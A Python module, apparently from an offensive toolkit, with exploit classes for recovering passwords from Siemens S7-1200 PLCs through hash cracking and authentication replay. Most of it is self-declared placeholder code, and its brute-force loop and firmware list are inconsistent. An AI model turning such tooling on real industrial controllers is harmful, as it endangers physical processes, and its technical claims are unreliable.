"""
Siemens S7-1200 Password Recovery Exploits

Exploits for recovering passwords from S7-1200 series PLCs.
Note: S7-1200 has stronger security than S7-300/400.
"""

import hashlib
import itertools
import string
from typing import Any


class S7_1200_WeakHash:
    """
    S7-1200 Weak Hash Recovery

    Early S7-1200 firmware (V1.x, V2.x) used a weak password
    hashing algorithm that can be attacked offline.

    The hash is based on a modified CRC with known weaknesses.

    This exploit extracts the hash and attempts offline cracking.
    """

    name = "S7-1200 Weak Hash Crack"
    description = "Crack weak password hash from early S7-1200 firmware"
    affected_vendors = ["Siemens"]
    affected_models = ["S7-1200", "S7-1211", "S7-1212", "S7-1214", "S7-1215", "S7-1217"]
    affected_firmware = ["V1.x", "V2.x", "V3.x"]
    cve = None

    def check_applicable(self, target) -> bool:
        """Check if exploit applies"""
        if not target.device:
            return False

        info = target.device.get_device_info()
        model = info.model.lower()
        firmware = info.firmware.lower()

        # Check model
        if 's7-1200' not in model and 's7-12' not in model:
            return False

        # Check firmware version (V1, V2, V3 are vulnerable)
        if 'v1' in firmware or 'v2' in firmware or 'v3' in firmware:
            return True

        return False

    def execute(self, target) -> dict[str, Any]:
        """
        Execute hash extraction and cracking.

        1. Try to extract password hash from PLC
        2. Attempt offline cracking of the hash
        """
        result = {
            'success': False,
            'password': None,
            'message': None,
            'hash': None,
        }

        if not target.device:
            result['message'] = "No device connection"
            return result

        try:
            # Extract hash
            hash_data = self._extract_hash(target)

            if hash_data:
                result['hash'] = hash_data['hash'].hex()

                # Try to crack
                password = self._crack_hash(hash_data['hash'], hash_data.get('salt'))

                if password:
                    result['success'] = True
                    result['password'] = password
                    result['message'] = "Password cracked from hash"
                else:
                    result['message'] = "Hash extracted but could not crack"
            else:
                result['message'] = "Could not extract password hash"

        except Exception as e:
            result['message'] = f"Exploit failed: {str(e)}"

        return result

    def _extract_hash(self, target) -> dict[str, Any] | None:
        """Extract password hash from S7-1200"""
        try:
            # S7-1200 stores password hash in specific memory region
            # Access through S7comm protocol


            # Try to read from system info area
            # The exact location depends on firmware version

            # This is a simplified approach - actual implementation
            # would need firmware-specific offsets

            protection = target.device.get_protection_status()

            if protection.protection_details:
                # Some info might be available
                pass

            # Attempt to get hash from challenge-response analysis
            # This is a more advanced technique

            return None  # Placeholder

        except Exception:
            return None

    def _crack_hash(self, hash_bytes: bytes, salt: bytes | None = None) -> str | None:
        """
        Attempt to crack the password hash.

        Uses the known weakness in early S7-1200 password hashing.
        """
        # Common password patterns for industrial systems
        common_passwords = [
            "", "1234", "0000", "1111", "password", "admin",
            "siemens", "SIEMENS", "plc", "PLC",
        ]

        # Try common passwords first
        for pwd in common_passwords:
            if self._verify_hash(pwd, hash_bytes, salt):
                return pwd

        # Try numeric patterns (very common in industrial)
        for length in range(1, 9):
            for combo in itertools.product(string.digits, repeat=length):
                pwd = ''.join(combo)
                if self._verify_hash(pwd, hash_bytes, salt):
                    return pwd

                # Limit attempts for performance
                if length >= 6:
                    break

        return None

    def _verify_hash(
        self,
        password: str,
        expected_hash: bytes,
        salt: bytes | None = None
    ) -> bool:
        """
        Verify if password matches hash.

        S7-1200 V1-V2 uses a modified CRC-based hash.
        """
        computed_hash = self._compute_s7_1200_hash(password, salt)
        return computed_hash == expected_hash

    def _compute_s7_1200_hash(
        self,
        password: str,
        salt: bytes | None = None
    ) -> bytes:
        """
        Compute S7-1200 password hash.

        Note: This is a simplified approximation.
        Actual implementation requires reverse-engineered algorithm.
        """
        # The actual S7-1200 hash algorithm is proprietary
        # This is a placeholder that shows the structure

        pwd_bytes = password.encode('utf-8')

        if salt:
            pwd_bytes = salt + pwd_bytes

        # Simplified hash (NOT actual S7-1200 algorithm)
        # Real implementation would use the reverse-engineered algorithm
        h = hashlib.sha256(pwd_bytes)
        return h.digest()[:8]  # S7-1200 uses 8-byte hash


class S7_1200_ProtocolReplay:
    """
    S7-1200 Protocol Replay Attack

    Early S7-1200 firmware was vulnerable to authentication
    replay attacks where captured authentication responses
    could be reused.

    This is mostly patched in V4+ firmware.
    """

    name = "S7-1200 Protocol Replay"
    description = "Replay captured authentication to bypass password"
    affected_vendors = ["Siemens"]
    affected_models = ["S7-1200"]
    affected_firmware = ["V1.x", "V2.x"]
    cve = "CVE-2019-13945"  # Related vulnerability

    def check_applicable(self, target) -> bool:
        """Check if exploit applies"""
        if not target.device:
            return False

        info = target.device.get_device_info()
        firmware = info.firmware.lower()

        return ('s7-1200' in info.model.lower() and
                ('v1' in firmware or 'v2' in firmware))

    def execute(self, target) -> dict[str, Any]:
        """
        Execute replay attack.

        Requires previously captured authentication traffic.
        """
        result = {
            'success': False,
            'password': None,
            'message': "Replay attack requires captured auth traffic",
        }

        # This exploit requires network capture of previous
        # authentication - not implementable without captured data

        return result
